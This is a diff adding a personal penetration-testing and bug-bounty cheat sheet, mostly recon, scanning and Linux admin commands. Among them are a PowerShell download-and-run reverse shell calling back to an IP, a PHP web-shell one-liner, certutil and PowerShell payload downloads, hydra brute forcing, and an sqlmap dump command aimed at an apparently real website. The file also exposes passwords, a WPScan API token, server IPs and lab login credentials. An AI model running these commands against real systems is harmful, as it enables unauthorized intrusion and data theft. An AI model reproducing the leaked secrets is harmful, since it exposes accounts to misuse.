@@ -1,0 +1,734 @@
+proxychains scp -P 30000 htp@23.254.204.35:~/newegg.txt ~/Desktop //下载
+
+proxychains scp ~/Desktop htp@23.254.204.35:~  //上传
+
+gobuster dir -u https://www.hotels.com -w ~/SecLists/Discovery/Web-Content/common.txt -o results1.txt  //gobuster
+
+https://www.kali.org/tools/seclists/  //教程
+
+sudo /etc/init.d/ssh restart  //重启ssh服务
+
+sudo mount -t vboxsf kali windows  //共享文件夹
+
+sudo /etc/init.d/ssh restart  //重启ssh：
+
+安装go：su
+
+export GOPATH=$HOME/go
+export PATH=$PATH:$GOPATH/bin
+export PATH=$PATH:$GOPATH/bin:/usr/local/go/bin
+
+vps:
+#update and upgrade repository:
+   sudo apt-get update
+   sudo apt-get upgrade
+#installing python3:
+   sudo apt-get install python3
+#installing git:
+   sudo apt-get install GIT
+#installing golang:
+   sudo apt-get install -y golang
+#Open the bashrc file to set gopath:
+   sudo nano ~/.bashrc
+#Paste the following lines at the end of bashrc file:
+export GOPATH=$HOME/go
+export PATH=$PATH:$GOPATH/bin
+export PATH=$PATH:$GOPATH/bin:/usr/local/go/bin
+
+export PATH=$PATH:~/go/bin  //go临时环境变量
+
+export PATH="~/go/bin:$PATH"  //永久当前用户，不生效
+
+export PATH="/PATH=$PATH:~/go/bin:$PATH"  //所有用户，不生效
+
+sudo vim ~/.zshrc  //kali修改环境变量
+export PATH=$PATH:~/go/bin   $HOME/.profile
+export PATH=$PATH:~/.local/bin
+export PATH=$PATH:~/dirsearch
+
+sort -u wordlist1.txt wordlist2.txt -o //去掉两个词典里重复的  
+
+sudo rm -rf www  //删除www文件夹
+
+pip3 install -r requirements.txt //python脚本安装依赖
+
+gowitness single https://www.facebook.com/ -p socks5://127.0.0.1:2341  //可以截屏
+
+gowitness file -f ./url.txt -p socks5://127.0.0.1:2341 -P ./url       //可以截取url列表
+
+gowitness SERVER -A  //启动服务器展示结果
+
+amass enum -passive -norecursive -df domains.txt -o subdomains.txt  //amass   接受一个顶级域名列表
+
+view-source:https://web.archive.org/cdx/search/cdx?url=indeedevents.com/*&output=text&fl=original&collapse=urlkey    //wayback
+
+cat domains.txt | waybackurls > urls //wayback
+
+echo "jobs.disneycareers.com" | waybackurls > job.txt  //wayback
+
+python3 forbiddenpass.py -t https://site --path login //绕过403
+
+
+mysql -u root -p  //进入数据库
+
+
+7z x manager.7z -r -o /home/xx
+解释如下：
+x 代表解压缩文件，并且是按原始目录解压（还有个参数 e 也是解压缩文件，但其会将所有文件都解压到根下，而不是自己原有的文件夹下）manager.7z 是压缩文件，这里大家要换成自己的。如果不在当前目录下要带上完整的目录
+-r 表示递归所有的子文件夹
+-o 是指定解压到的目录，这里大家要注意-o后是没有空格的直接接目录
+
+
+sudo vim /etc/apt/apt.conf.d/proxy.conf  // apt代理
+
+sudo vim ~/.:/config   // ssh配置文件
+
+vim /etc/ssh/sshd_config //服务器修改端口
+
+sudo apt update
+sudo apt full-upgrade   // parrot os
+
+
+
+wc -l small.txt // 查看txt文件中的行数
+
+#https://blog.csdn.net/FionaAI/article/details/105174160
+screen -ls
+screen -S test     ctrl+a then d  detach
+Detached当前screen没有被打开，Attached当前screen打开状态
+screen -r 15659.test
+screen -X -S 16283.you quit                       
+
+screen -r -d 15156
+
+
+egrep -iv “hello” file.txt 会显示file.txt中所有不含"hello"的行，不论是大写还是小写。-i 参数表示忽略大小写，-v 参数表示反向匹配。
+
+
+#git and git hub
+
+git init
+
+touch .gitignore //linux
+
+git add .
+
+git commit -m "commit"
+
+git remote add origin https://github.com/HackerTXK/Repository  //第二次不用
+
+git push origin main
+
+
+cat urls.txt | grep -E -iv "\.js|\.png|=|\.css|\.xml|\.svg|\.jpg|\.txt" | sed 's/\?.*//' | uro | tee no.txt // 提取所有可以进行参数破解的url
+
+
+( \[[0-9]+\])  //去掉httpx结果后的长度显示
+
+
+creds search SMB  //search default creds
+
+
+sudo ufw enable
+
+sudo ufw reload
+
+ufw allow 9000
+
+ufw status
+
+wordpressuser walq.0com
+htp walq.0com
+
+
+ufw app list 
+ufw allow OpenSSH
+ufw enable
+ufw status
+
+show databases;
+DROP DATABASE htp;
+
+SELECT User, Host FROM mysql.user;
+DROP USER 'htp'@'%';
+
+
+CREATE DATABASE wordpress DEFAULT CHARACTER SET utf8 COLLATE utf8_unicode_ci;
+CREATE USER 'wordpressuser'@'localhost' IDENTIFIED WITH mysql_native_password BY 'walq.0com';
+sudo apt install php-curl php-gd php-mbstring php-xml php-xmlrpc php-soap php-intl php-zip
+sudo systemctl restart apache2
+
+what is .htaccess
+&y4M1ObeKmPPZF)e7F
+
+
+ps -A | grep mysqld
+sudo pkill mysqld
+sudo pkill mysqld
+sudo systemctl restart mysql
+sudo mysql -u root
+
+sudo service apache2 status
+sudo service apache2 start
+
+sudo service mysql status
+sudo service mysql start
+
+
+sudo service docker status
+
+sudo docker pull acgpiano/sqli-labs:latest
+sudo docker run -d -p 83:80 acgpiano/sqli-labs:latest
+
+
+
+https://dm116.github.io/2020/04/12/how-to-uninstall-software-on-kali-linux/  
+#unstall app on kali
+
+dpkg --list
+sudo apt --purge remove app
+sudo apt remove gimp
+sudo apt-get autoremove
+sudo apt purge --auto-remove gimp
+sudo apt clean
+
+pip3 install -r requirements.txt
+
+
+
+sudo apt-get install gtk2-engines
+
+update-alternatives --config java
+
+
+#gobuster
+cat assets.txt | while read url;do gobuster dns -d $url -w best-dns-wordlist.txt -o tmp.txt --no-color && cat tmp.txt >> dns_sub.txt;done
+
+gobuster dns -w ~/best-dns-wordlist.txt -d hometogo.com --no-color -o dns.txt
+
+
+
+#nmap
+nmap -sV -iL subdomains.txt -oN scaned-port.txt --script=vuln --exclude-ports 80,443
+
+nmap -sV -oN scaned-port.txt --script=vuln --exclude-ports 80,443 -p- -iL subdomains.txt
+
+\d+/\w+ *open   grep open port
+
+#httpx
+cat sub.txt | httpx -t 10 -rl 20 -cl -nc | merge_url.py -o live_sub_merge.txt
+
+cat all-sub.txt | httpx -sc -cl -ct -title -td -o live-sub.txt -t 20
+
+
+
+#waymmore
+waymore -i test.txt -mode U -oU waymore.txt
+#endpoints resembling feedback forms:
+cat waymore.txt | grep -viE '\.png|\.jpg|\.jpeg|\.css|\.js|\.svg|\.gif' | grep -iE 'feedback|support' | qsreplace FUZZ | sort -u | httpx -t 300 | anew waymore-filtered.txt
+
+#Endpoints with user registration process, and login::
+cat waymore.txt | grep -viE '\.png|\.jpg|\.jpeg|\.css|\.js|\.svg|\.gif' | grep -iE 'login|register|auth|sign|account' | qsreplace FUZZ | sort -u | httpx -t 300 | anew waymore-filtered.txt
+
+#history to param
+cat history.txt | grep "?" | grep -E -v "\.pdf|\.js|\.css|\.png|\.jpg|\.jpeg" | uro | tee param.txt
+
+cat param.txt | httpx -rl 20 -t 10 -cl -sc -fc 404 -fr
+
+
+#wpscan
+wpscan --url https://www.fossilgroup.com/ --random-user-agent
+
+#python server
+sudo python3 -m http.server 80
+
+
+
+#ssh config quick login
+vim ~/.ssh/config
+Host htp
+		HostName 104.168.138.64
+		User htp
+		Port 30000
+		
+		
+		
+		
+		
+#amass
+amass enum -passive -norecursive -df domains.txt -o subdomains.txt 
+
+amass enum -brute -o test111111.txt -d baidu.com -v
+
+#cache test  doesn't work, I don't know why, but burp can work
+ffuf -w ~/Desktop/qed_fuzz/headers/1-4142.txt:PARAM -w ~/Desktop/qed_fuzz/headers/headers.txt:HEADER -o test111.html -of html -t 8 -p "0.3-0.5" -mode pitchfork -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36" -H "HEADER:test222" -u https://developer.mozilla.org/en-US/?test333ggfhqedPARAM -v
+
+
+#recon   
+subfinder -dL domains.txt -o 1sub.txt && amass enum -passive -norecursive -df domains.txt -o 2sub.txt && sort -u 1sub.txt 2sub.txt -o subdomains.txt && cat subdomains.txt | httpx -t 10 -rl 20 -cl -nc -o live_sub.txt && cat live_sub.txt | merge_url.py -o live_sub_merge.txt
+
+subfinder -d example.com -o 1sub.txt && amass enum -passive -norecursive -d example.com -o 2sub.txt && sort -u 1sub.txt 2sub.txt -o subdomains.txt && cat subdomains.txt | httpx -t 8 -rl 20 -cl -nc -o live_sub.txt && cat live_sub.txt | merge_url.py -o live_sub_merge.txt
+
+
+
+
+#rustscan
+rustscan -a 54.254.118.238 -r 1-65535 -u 5000
+
+
+#katana
+katana -u https://www.shayakahve.com.tr/ -jc -hl -sc -xhr -rl 10 -o crawling.txt -nc -p 1 -H 'Cookie: '
+katana -list domains.txt -jc -ct 1000 -xhr -rl 30 -nc -p 5 -o crawling.txt -c 5
+
+#Gxss
+cat param.txt | Gxss -p qed\<test -c 10 | tee 1maybexss.txt && cat param.txt | Gxss -p qed\"test -c 10 | tee 2maybexss.txt
+Gxss -p testqed -c 10 < nojs-uro-param.txt > all-reflect.txt
+
+
+#anew   Note that the new lines added to things.txt are also sent to stdout, this allows for them to be redirected to another file:
+▶ cat newthings.txt | anew things.txt > added-lines.txt
+▶ cat added-lines.txt
+Three
+Four
+
+#dirsearch config.ini
+
+dirsearch -u https://example.com -f -O -o dirsearch_fuzz.txt
+
+
+
+#js-beautify
+js-beautify -r example.js
+js-beautify -r *.js
+js-beautify -r *.js*
+
+
+# uro or urless
+
+
+
+
+
+# naabu
+naabu -l subdomains.txt -p - -ep 80,443 -o naabu_scan.txt -nmap-cli "nmap -sV -Pn -oN nmap.txt" -nc
+
+
+#sqlmap
+sqlmap -u "https://www.thecatalysteducation.in/details.php?id=31*&type=2" --dbs --dbms=mariadb --dump --random-agent --batch --technique=T
+
+#whatweb
+whatweb -a3 -v https://www.facebook.com
+whatweb -a3 -v --user-agent "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0" https://www.facebook.com   # ==ww3    alias
+
+#regex  remove dir
+
+(?<=[A-Za-z])/
+(?<=[A-Za-z])(/.+)
+?<=[A-Za-z])(/.?)
+
+
+ \[\d+\]
+ 
+ 
+
+#check file size
+ls -lh
+
+
+#grep  gf
+
+grep -HanrE "location\." jstest/
+
+gf jsvar jstest/
+
+gf xss uro_his_waymore.txt
+
+# scp dir
+
+scp -r ~/Desktop/google_drive/ recon:~/Desktop
+
+
+#shodan
+
+Ssl.cert.subject.CN%3A%22grammarly%22&facet=http.title
+
+
+# gitlab
+
+https://gitlab.com/groups/gitlab-org/-/issues/?sort=created_date&state=closed&label_name%5B%5D=HackerOne&first_page_size=20
+
+#puredns
+
+puredns bruteforce jhaddix.txt baidu.com -r resolvers/resolvers-trusted.txt -w dns_puredns.txt
+puredns bruteforce ~/qed_fuzz/best-dns-wordlist.txt -d domains.txt -r ~/qed_fuzz/resolvers/resolvers-trusted.txt -w 2dns_sub.txt
+
+puredns resolve all-alterx.txt -r ~/qed_fuzz/resolvers/resolvers.txt -w all-resolves.txt
+
+# alterx
+cat baidu-sub.txt | alterx -o alterx.txt
+
+#wpscan
+
+wpscan -e vp --rua --force --disable-tls-checks --api-token e0YYFbDnbu12Ij9SB1fr5NUwRqY8V7l4Nzrl9Wap5zA --url https://example.com
+
+wpscan -e vt --rua --force --disable-tls-checks --api-token e0YYFbDnbu12Ij9SB1fr5NUwRqY8V7l4Nzrl9Wap5zA --url https://example.com
+
+
+#adb 
+
+adb shell settings put global http_proxy localhost:3333
+adb reverse tcp:3333 tcp:8082
+
+
+adb connect 127.0.0.1:6555
+
+adb shell settings put global http_proxy 192.168.0.194:8082
+adb shell settings put global http_proxy :0
+
+
+
+#unfurl
+▶ cat urls.txt | unfurl domains
+sub.example.com
+sub.example.com
+example.net
+
+▶ cat urls.txt | unfurl --unique domains
+sub.example.com
+example.net
+
+
+echo "miemp1.vpn.att.com" | unfurl format "%r.%t" #root domain
+
+
+
+
+
+#split
+
+split -n 2 test111.txt
+
+
+test111.txt  xaa  xab
+
+
+┌──(ttmachine㉿kali)-[~/…/hunt/DoD/all-history/test111]
+└─$ split -l 3 test111.txt 
+
+┌──(ttmachine㉿kali)-[~/…/hunt/DoD/all-history/test111]
+└─$ ls       
+test111.txt  xaa  xab  xac  xad  xae
+
+┌──(ttmachine㉿kali)-[~/…/hunt/DoD/all-history/test111]
+└─$ cat xaa
+1
+1
+2
+
+
+split -d -l 1000 uro-param-history.txt uro-history-
+split -d -n 30 my_data.txt data_part_
+
+split -l 1000 -d -a 3 large_file.txt part_   #-a 3: Specifies the length of the numeric suffix (in this case, 3 digits, e.g., 000, 001, 002).
+
+split -n 99 -d -a 2 all-passive.txt all-passive
+
+
+#figlet and lolcat
+figlet "Hack the planet" -f smslant | lolcat -p 0.5
+
+#uninstall app
+#uninstall app
+sudo apt remove vlc
+sudo apt purge vlc
+sudo snap remove vlc
+
+# hakrevdns
+
+\d+\.\d+\.\d+\.\d+\s+
+
+\.$
+
+# amass
+
+amass intel -d example.com -whois   # reverse whois
+
+amass intel -active -cidr 173.0.84.0/24  # SSL Certificate Grabbing
+
+amass intel -org "Tesla"    --> amass intel -active -asn 394161  # Using ASNs
+
+#mint
+
+export host="13.83.242.179"
+ 
+
+#feroxbuster
+
+cat unfurl-php-domain.txt | feroxbuster --stdin -w ~/Desktop/google_drive/qed_fuzz/dir-and-file/php/Common-PHP-Filenames.txt -A -t 8 -n -L 5 -o fuzz-php.txt --dont-extract-links -k 
+
+
+#display 100 lines
+
+head -n 100 your_file.txt   #first 100 lines
+
+tail -n 100 your_file.txt   #last 100 lines
+
+
+#httpx
+
+httpx -l interestingsub.txt -sc -cl -title -o httpx-interestingsub.txt -rl 100 -t 30 -nc
+
+
+
+#sed
+
+sed 's/=.*/=/'     //去掉等号后的值
+sed 's/URL: //'    //去掉URL：和空格
+sed 's/Found: //'  //替换gobuster Found
+sed -E 's/(https?:\/\/[^\/]+)(.+)/\1/g' input.txt | tee output.txt   #https://www.cnblogs.com/linux-wangkun/p/5745584.html //sed命令
+
+sed 's/baidu\.com/bing.com/g' redirect\&ssrf.txt > test111.txt // 替换字符命令。注意，在vscode中也可以进行编辑替换 
+
+sed 's/php/php\/testqed/g' test111.txt
+
+ffuf -c -ac -t 10 -rate 100 -of html -u https://${host}/FUZZ -o ${host}_$(date +%m-%d_%H-%M-%S).html -w ~/Desktop/google_drive/qed_fuzz/dir-and-file/
+
+ffuf -c -ac -of html -t 30 -u https://${host}/FUZZ -o ${host}_$(date +%m-%d_%H-%M-%S).html -w ~/Desktop/google_drive/qed_fuzz/dir-and-file/
+
+#Using a Python virtual environment
+python3 -m venv myenv   #python
+
+source myenv/bin/activate #python
+
+pip install requests #python
+
+deactivate   #exit python env
+
+pip freeze > requirements.txt
+
+pip install -r requirements.txt
+
+#subfinder
+
+subfinder -all   #using all source
+
+xsltproc target.xml -o target.html   #convert the stored results from XML format to HTML
+
+linkfinder -i "*.js" -o cli > link.txt	#linkfinder, all current js file's link
+
+secretfinder -i "*.js" -o cli > secret.txt	#secret, all current js file's secret
+
+#regex   https://www.runoob.com/regexp/regexp-syntax.html
+\w	#Match letters, numbers, and underscores. Equivalent to [A-Za-z0-9_]
+
+
+-------------------------------------------------------
+
+<pre style="background: rgb(238, 238, 238); border-bottom-color: initial; border-bottom-style: initial; border-image: initial; border-left-color: initial; border-left-style: initial; border-radius: 10px; border-right-color: initial; border-right-style: initial; border-top-color: rgb(221, 221, 221); border-top-style: solid; border-width: 5px 0px 0px; color: #444444; font-family: &quot;Courier New&quot;, Courier, monospace; font-stretch: inherit; font-variant-east-asian: inherit; font-variant-numeric: inherit; line-height: inherit; margin-bottom: 1.5em; margin-top: 0px; overflow-wrap: normal; overflow: auto; padding: 12px; vertical-align: baseline;"><span style="font-size: 13px;">Replace the text with codes</span></pre><p>Start write the next paragraph here </p>  #code box
+
+------------------------------------------------------
+
+
+crontab -e   #open cron job config file
+
+
+
+
+test111
+
+mtk   #backup mint's fuzz dir and file to kali's google drive dir
+
+backup.sh   #backup kali's google drive dir to google drive
+
+Explain Like I'm Five #https://www.reddit.com/r/explainlikeimfive/
+
+
+wget "https://raw.githubusercontent.com/orwagodfather/WordList/main/iis.txt" -O godfather-iis.txt   #download and filename
+
+
+htbacademy   #hack the box academy openvpn connect
+
+
+Ctrl+A: Moves to the beginning of the line.
+Ctrl+E: Moves to the end of the line.
+Ctrl+B: Moves backward one character.
+Ctrl+F: Moves forward one character.
+Alt+B: Moves backward one word.
+Alt+F: Moves forward one word.
+
+openrecon   #open recon directory in vscode
+
+smap baidu.com   #smap
+
+getJS -url "https://youachieve.att.com/" -complete | while read url;do wget $url ; done   #download a site's all js file
+
+
+(?<!exp2)exp1   #regex no exp2 in front of exp1
+exp1(?!exp2)    #regex no exp2 behind of exp1
+
+echo $ot   #display output time
+
+ sort -k 3 2begin.txt
+ sort -k 4 2begin.txt -o test111.txt
+ sort -k 3 2begin.txt.bak -o 2begin.txt   #sort according to which colum, default blank is interval
+
+
+#!/bin/sh  #bash  zsh
+
+#sublist3r
+printf "${blue}Passive step 3, subllist3r...${nc}\n"   #loop
+cat domains.txt | while read url; do   #loop
+   sublist3r.py 1>/dev/null -d "$url" -o tmp.txt && cat tmp.txt >> 1-passive-sub/3sub.txt   #loop
+    echo "$url";  #loop
+done      #loop
+
+secretfinder -i "*.js" -o cli > secret.txt   #secretfinder in js file
+
+
+--exclude-ports T:21,25,80,444: This option tells nmap to exclude specific ports from the scan. The 'T:' prefix indicates TCP ports. So, ports 21 (FTP), 25 (SMTP), 80 (HTTP), and 444 (unknown) will be skipped.   #nmap
+
+nmap -p 1-79,81-442,444-65535   #nmap exclude 80, 443 port
+
+
+--------------bash loop--------------
+#!/bin/bash   #bash loop
+#Automator by @4z1zu   #bash loop
+while read line; do #bash loop
+        #subfinder -d $line; #bash loop
+        echo $line  #bash loop
+done < $1   #bash loop
+-------------bash loop-------------- 
+
+-------------kali install clash-------------
+sudo apt --purge remove libturbojpeg0:amd64
+
+then install all these packages:
+clash-verge_1.7.5_amd64.deb
+clash_config.txt
+libicu74_74.2-1ubuntu3_amd64.deb
+libjavascriptcoregtk-4.0-18_2.43.3-1_amd64.deb
+libjpeg-turbo8_1.5.2-0ubuntu5_amd64.deb
+libjpeg8_8c-2ubuntu8_amd64.deb
+libwebkit2gtk-4.0-37_2.43.3-1_amd64.deb
+multiarch-support_2.27-3ubuntu1_amd64.deb
+
+
+
+sudo vim /etc/hostname  #change hostname
+
+
+
+quit telnet connect   #enter quit and hit enter
+
+locate burpsuite  #lookup a file or app
+
+| sed -r '/^\s*$/d'  #delete blank line
+
+tar -xvzf community_images.tar.gz   #tar unzip, auto generate folder
+tar -xvzf community_images.tar.gz -C some_custom_folder_name  #tar unzip, custom folder
+
+nmap --disable-arp-ping
+
+pip install Flask Flask-SQLAlchemy #flask
+
+sudo vnstat -l -i enp6s0  #monitor network adapter
+
+gunzip -S .zip upload_nix.zip #unzip command
+
+xfreerdp /v:10.129.204.126 /u:htb-student /p:HTB_@cademy_stdnt!   #xfreerdp
+
+
+https://www.bing.com/   #bing
+
+
+apache tomcat  #java jsp
+
+
+
+/opt/metasploit-framework/embedded/framework   #metasploit path
+
+meterpreter > search flag.txt
+
+find / -name flag.txt   #bash
+
+
+
+hydra -l Kira -P mut_password.list ftp://10.129.43.98 -t 50   #hydra
+
+test222
+
+test111
+
+sudo php -S 0.0.0.0:80
+
+katana -u http://10.10.95.204/ -jc -ct 1000 -xhr -rl 30 -nc -p 5 -o crawling.txt -c 5
+
+man ascii
+
+ascii -h
+
+gobuster dir -u http://94.237.59.63:39008/ -w ~/Desktop/google_drive/qed_fuzz/dir-and-file/generic/common.txt
+
+Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\Windows	emp\socat.exe   #windows
+
+ffuf -c -ac -ic -u https:///FUZZ -w ~/tool   #-ic Ignore wordlist comments
+
+sudo systemctl restart nginx   #nginx
+
+for i in $(seq 1 1000); do echo $i >> ids.txt; done   #generate 1-1000
+
+curl http://admin.academy.htb:51353/admin/admin.php -d "id=73"   #curl post request
+
+<?php echo system("hostname");?>   #php shell
+
+seq 65535 > ports.txt
+
+strings program   #check if have string
+
+xfreerdp /v:10.10.170.38 /u:administrator /p:letmein123! /dynamic-resolution   #/f  /size:1920x1080   remote connect
+
+-A: Enable OS detection, version detection, default NSE scripts (-sC) scanning, and traceroute   #nmap  -sC is --script=default
+
+--script vuln   #finding known vulnerabilities  nmap
+
+-p-400   #nmap scan ports starting from 1 up to 400
+
+scan exclude the most common 1000 ports in the background  #nmap scan, write a script
+wget -O file.txt   #output file
+
+john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash   #john
+
+Invoke-WebRequest http://10.17.43.24/PrintSpoofer64.exe -O PrintSpoofer64.exe   #windows download
+powershell.exe -c "Invoke-WebRequest -Uri 'http://10.17.43.24/PrintSpoofer64.exe' -OutFile 'PrintSpoofer64.exe'"   #windows download
+certutil -urlcache -split -f http://example.com/Advanced.exe C:\Users\Public\Advanced.exe   #cmd download file
+
+Remove-Item -Path "C:\Temp\testfile.txt"   #powershell delete file
+
+https://chatgpt.com/share/66f101b9-7394-800a-a496-b5f4dbb525e6   #ubuntu install john
+
+https://chatgpt.com/share/66f15cd0-0500-800a-acc7-209b7c5d289d   #delete chrome shortcut app
+
+md5sum example.txt   # get md5sum
+
+john --list=formats | grep -iF "md5"   #john format
+
+powershell iex (New-Object Net.WebClient).DownloadString('http://10.11.105.179/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.11.105.179 -Port 1111   #executes it immediately  request
+
+touch test.txt  #If test.txt doesn't exist, it will create an empty file. If test.txt already exists, the command will update its timestamps but leave the contents unchanged.
+
+go mod init your_project_name   #go external package use
+
+
+go install github.com/PuerkitoBio/goquery@latest   #go external package use
+
+import (   #go external package use
+    "github.com/PuerkitoBio/goquery"   #go external package use
+)   #go external package use
+
+go mod tidy  #go external package use
+
+git remote -v   #Check the current remote URL
+
+git remote set-url origin https://github.com/new-username/repository.git  #Update the remote URL with your new GitHub username
+
+
